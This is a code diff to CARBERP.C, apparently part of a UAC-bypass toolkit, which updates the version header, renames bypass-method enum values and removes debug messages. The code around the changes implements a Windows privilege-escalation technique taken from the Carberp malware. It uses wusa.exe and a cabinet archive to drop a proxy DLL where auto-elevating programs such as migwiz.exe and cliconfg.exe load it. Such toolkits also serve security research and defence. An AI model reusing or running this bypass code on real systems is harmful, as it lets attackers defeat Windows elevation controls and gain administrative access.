@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2015
+*  (C) COPYRIGHT AUTHORS, 2014 - 2016
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     1.60
+*  VERSION:     2.00
 *
-*  DATE:        20 Apr 2015
+*  DATE:        16 Nov 2015
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -51,7 +51,6 @@ BOOL ucmWusaExtractPackage(
 		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
 		bResult = supRunProcess(L"cmd.exe", szCmd);
 		if (bResult == FALSE) {
-			OutputDebugString(TEXT("[UCM] Wusa extract files failed"));
 			break;
 		}
 
@@ -72,7 +71,7 @@ BOOL ucmWusaExtractPackage(
 *
 */
 BOOL ucmWusaMethod(
-	DWORD dwType,
+	UACBYPASSMETHOD Method,
 	PVOID ProxyDll,
 	DWORD ProxyDllSize
 	)
@@ -89,17 +88,17 @@ BOOL ucmWusaMethod(
 		return FALSE;
 	}
 
-	switch (dwType) {
+	switch (Method) {
 
 	//use migwiz.exe as target
-	case METHOD_CARBERP:
+	case UacMethodCarberp1:
 		lpSourceDll = METHOD_MIGWIZ_SOURCEDLL;
 		lpCommandLine = METHOD_MIGWIZ_CMDLINE;
 		lpTargetProcess = METHOD_MIGWIZ_TARGETAPP;
 		break;
 
 	//use cliconfg.exe as target
-	case METHOD_CARBERP_EX:
+	case UacMethodCarberp2:
 		lpSourceDll = METHOD_SQLSRV_SOURCEDLL;
 		lpCommandLine = METHOD_SQLSRV_CMDLINE;
 		lpTargetProcess = METHOD_SQLSRV_TARGETAPP;
@@ -175,7 +174,6 @@ BOOL ucmCreateCabinetForSingleFile(
 			break;
 		}
 		if (!supWriteBufferToFile(szDllFileName, ProxyDll, ProxyDllSize)) {
-			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
 			break;
 		}
 
@@ -194,7 +192,6 @@ BOOL ucmCreateCabinetForSingleFile(
 			cabClose(Cabinet);
 		}
 		else {
-			OutputDebugString(TEXT("[UCM] Error creating cab archive"));
 			break;
 		}
 
